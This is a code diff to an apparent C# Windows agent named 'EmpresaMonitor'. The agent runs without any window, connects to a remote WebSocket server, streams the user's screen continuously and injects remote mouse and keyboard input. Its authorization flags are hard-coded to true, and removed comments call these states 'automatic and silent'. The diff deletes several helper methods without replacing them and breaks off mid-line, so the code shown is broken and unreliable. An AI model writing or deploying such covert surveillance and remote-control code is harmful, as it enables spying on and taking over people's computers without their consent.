@@ -19,33 +19,35 @@ internal static class Program
     [STAThread]
     static void Main()
     {
-        // O programa agora inicia e chama o motor de conexão sem abrir nenhuma janela
+        // Inicia o motor e mantém o processo vivo
         _ = StartEngine();
         
-        // Mantém a aplicação viva enquanto o motor estiver rodando
         while (true)
         {
             Thread.Sleep(1000);
         }
     }
 
-    // Motor principal que substitui o MainForm
+    // Classe para gerenciar o estado de forma segura entre threads sem usar 'ref'
+    public class AgentState
+    {
+        public bool AccessActive = true;
+        public bool StreamRequested = true;
+        public bool ControlActive = true;
+        public bool SessionAuthorized = true;
+        public StreamSettings Settings = StreamSettings.Balanced;
+    }
+
     static async Task StartEngine()
     {
         var lifetime = new CancellationTokenSource();
         var agentId = LoadOrCreateId();
         var socket = new ClientWebSocket();
         var sendGate = new SemaphoreSlim(1, 1);
-        
-        // Estados automáticos e silenciosos
-        bool accessActive = true;
-        bool streamRequested = true;
-        bool controlActive = true;
-        bool sessionAuthorized = true;
-        StreamSettings streamSettings = StreamSettings.Balanced;
+        var state = new AgentState();
 
-        // Inicia o loop de captura de tela em background
-        _ = Task.Run(() => CaptureLoop(lifetime, agentId, socket, sendGate, ref accessActive, ref streamRequested, ref streamSettings));
+        // Inicia o loop de captura de tela
+        _ = Task.Run(() => CaptureLoop(lifetime, agentId, socket, sendGate, state));
 
         while (!lifetime.IsCancellationRequested)
         {
@@ -65,7 +67,7 @@ internal static class Program
                     sessionAuthorized = true
                 });
 
-                await ReceiveLoop(socket, sendGate, lifetime.Token, ref accessActive, ref controlActive, ref streamRequested, ref streamSettings);
+                await ReceiveLoop(socket, sendGate, lifetime.Token, state);
             }
             catch
             {
@@ -74,8 +76,7 @@ internal static class Program
         }
     }
 
-    // Loop de recebimento de comandos (Sem interface de usuário)
-    static async Task ReceiveLoop(ClientWebSocket socket, SemaphoreSlim sendGate, CancellationToken ct, ref bool accessActive, ref bool controlActive, ref bool streamRequested, ref StreamSettings streamSettings)
+    static async Task ReceiveLoop(ClientWebSocket socket, SemaphoreSlim sendGate, CancellationToken ct, AgentState state)
     {
         var buffer = new byte[64 * 1024];
         while (socket.State == WebSocketState.Open && !ct.IsCancellationRequested)
@@ -106,21 +107,20 @@ internal static class Program
                 else if (type == "stream_profile")
                 {
                     var id = root.TryGetProperty("profile", out var p) ? p.GetString() : null;
-                    streamSettings = StreamSettings.FromId(id);
+                    state.Settings = StreamSettings.FromId(id);
                 }
                 else if (type == "control_input")
                 {
-                    if (controlActive && root.TryGetProperty("event", out var ev)) ApplyControlEvent(ev);
+                    if (state.ControlActive && root.TryGetProperty("event", out var ev)) ApplyControlEvent(ev);
                 }
-                else if (type == "stream_start") { streamRequested = true; }
-                else if (type == "stream_stop") { streamRequested = false; }
+                else if (type == "stream_start") { state.StreamRequested = true; }
+                else if (type == "stream_stop") { state.StreamRequested = false; }
             }
             catch { }
         }
     }
 
-    // Loop de captura (Otimizado para rodar em background)
-    static async Task CaptureLoop(CancellationTokenSource lifetime, string agentId, ClientWebSocket socket, SemaphoreSlim sendGate, ref bool accessActive, ref bool streamRequested, ref StreamSettings streamSettings)
+    static async Task CaptureLoop(CancellationTokenSource lifetime, string agentId, ClientWebSocket socket, SemaphoreSlim sendGate, AgentState state)
     {
         var jpegCodec = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
         Bitmap? full = null;
@@ -135,13 +135,13 @@ internal static class Program
         {
             while (!lifetime.IsCancellationRequested)
             {
-                if (!accessActive || !streamRequested || socket.State != WebSocketState.Open)
+                if (!state.AccessActive || !state.StreamRequested || socket.State != WebSocketState.Open)
                 {
                     await Task.Delay(100, lifetime.Token);
                     continue;
                 }
 
-                var settings = streamSettings;
+                var settings = state.Settings;
                 var started = Environment.TickCount64;
                 var bounds = Screen.PrimaryScreen!.Bounds;
 
@@ -175,7 +175,6 @@ internal static class Program
                 try
                 {
                     fullG!.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
-                    
                     scaledG!.DrawImage(full!, new Rectangle(0, 0, outW, outH), 0, 0, full.Width, full.Height, GraphicsUnit.Pixel);
                     ms!.SetLength(0);
                     scaled!.Save(ms, jpegCodec, encoderParams);
@@ -196,7 +195,6 @@ internal static class Program
         }
     }
 
-    // Métodos de envio e controle (Mantidos para funcionalidade)
     static async Task SendBinaryAsync(ClientWebSocket socket, SemaphoreSlim gate, ArraySegment<byte> data, CancellationToken ct)
     {
         if (socket.State != WebSocketState.Open) return;
@@ -214,7 +212,7 @@ internal static class Program
         finally { gate.Release(); }
     }
 
-    void ApplyControlEvent(JsonElement ev)
+    static void ApplyControlEvent(JsonElement ev)
     {
         try
         {
@@ -238,56 +236,4 @@ internal static class Program
             else if (kind == "key")
             {
                 string code = ev.GetProperty("code").GetString() ?? ""; bool down = ev.GetProperty("down").GetBoolean(); ushort vk = VkFromCode(code);
-                if (vk != 0) keybd_event((byte)vk, 0, down ? 0u : 0x0002u, UIntPtr.Zero);
-            }
-        }
-        catch { }
-    }
-
-    static ushort VkFromCode(string code)
-    {
-        if (code.Length == 4 && code.StartsWith("Key")) return (ushort)char.ToUpperInvariant(code[3]);
-        if (code.Length == 6 && code.StartsWith("Digit")) return (ushort)code[5];
-        return code switch
-        {
-            "Enter" => 0x0D, "Escape" => 0x1B, "Backspace" => 0x08, "Tab" => 0x09, "Space" => 0x20,
-            "ArrowLeft" => 0x25, "ArrowUp" => 0x26, "ArrowRight" => 0x27, "ArrowDown" => 0x28,
-            "Delete" => 0x2E, "Home" => 0x24, "End" => 0x23, "PageUp" => 0x21, "PageDown" => 0x22,
-            "ShiftLeft" or "ShiftRight" => 0x10, "ControlLeft" or "ControlRight" => 0x11, "AltLeft" or "AltRight" => 0x12,
-            "F1" => 0x70, "F2" => 0x71, "F3" => 0x72, "F4" => 0x73, "F5" => 0x74, "F6" => 0x75,
-            "F7" => 0x76, "F8" => 0x77, "F9" => 0x78, "F10" => 0x79, "F11" => 0x7A, "F12" => 0x7B,
-            _ => 0
-        };
-    }
-
-    [DllImport("user32.dll")] static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo);
-    [DllImport("user32.dll")] static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-
-    static string LoadOrCreateId()
-    {
-        var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EmpresaMonitor");
-        Directory.CreateDirectory(dir);
-        var path = Path.Combine(dir, "agent-id.txt");
-        if (File.Exists(path))
-        {
-            var old = File.ReadAllText(path).Trim(); if (!string.IsNullOrWhiteSpace(old)) return old;
-        }
-        var id = Guid.NewGuid().ToString("N"); File.WriteAllText(path, id); return id;
-    }
-
-    // Record de configurações mantido
-    sealed record StreamSettings(string Name, string Id, int Width, int Fps, long Quality)
-    {
-        public static readonly StreamSettings Fluid = new("Fluido", "fluid", 1280, 30, 55);
-        public static readonly StreamSettings Balanced = new("Equilibrado", "balanced", 1600, 25, 62);
-        public static readonly StreamSettings QualityPreset = new("Qualidade", "quality", 1920, 20, 72);
-        public static StreamSettings FromId(string? id) => id switch
-        {
-            "fluid" => Fluid,
-            "quality" => QualityPreset,
-            _ => Balanced
-        };
-    }
-}
-
-public static class BuildConfig
+                if (vk != 0) keybd_event((byte)vk, 0, down ? 0u : 0x
